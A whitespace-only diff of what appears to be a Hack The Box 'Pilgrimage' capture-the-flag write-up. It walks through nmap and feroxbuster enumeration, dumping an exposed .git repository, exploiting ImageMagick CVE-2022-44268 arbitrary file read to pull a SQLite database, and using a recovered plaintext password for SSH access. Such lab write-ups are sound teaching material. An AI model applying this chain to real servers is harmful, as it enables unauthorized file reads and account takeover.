@@ -32,14 +32,12 @@ PORT     STATE SERVICE VERSION
 80/tcp   open  http    nginx 1.18.0
 |_http-title: Did not follow redirect to http://pilgrimage.htb/
 |_http-server-header: nginx/1.18.0
+
+
 Feroxbuster
 We run a feroxbuster scan to enumerate potentially exposed directories and endpoints.
 
-
-
 feroxbuster --url http://pilgrimage.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
-
-
 Found: 
 http://pilgrimage.htb/.git/
 http://pilgrimage.htb/.git/logs/
@@ -50,6 +48,8 @@ http://pilgrimage.htb/assets/js/
 http://pilgrimage.htb/tmp/
 http://pilgrimage.htb/vendor/
 http://pilgrimage.htb/vendor/jquery/
+
+
 Git Dumper
 The scan reveals an exposed .git directory. We use git-dumper to dump and recreate the repository.
 
@@ -61,8 +61,6 @@ Foothold
 The repository contains a custom ImageMagick binary:
 
 ./magick --version
-
-
 Version: ImageMagick 7.1.0-49 beta
 This version is vulnerable to CVE-2022-44268 (Arbitrary File Read via PNG tEXt chunk).
 
@@ -98,7 +96,6 @@ From the downloaded repo we find:
 $db = new PDO('sqlite:/var/db/pilgrimage');
 We exploit again, this time targeting the SQLite DB path:
 
-
 cargo run "/var/db/pilgrimage"
 Convert the hex data into an SQLite file:
 
@@ -125,7 +122,6 @@ SELECT * FROM users;
 
 emily|abigchonkyboi123
 SSH Access
-bash
 
 ssh emily@pilgrimage.htb
 
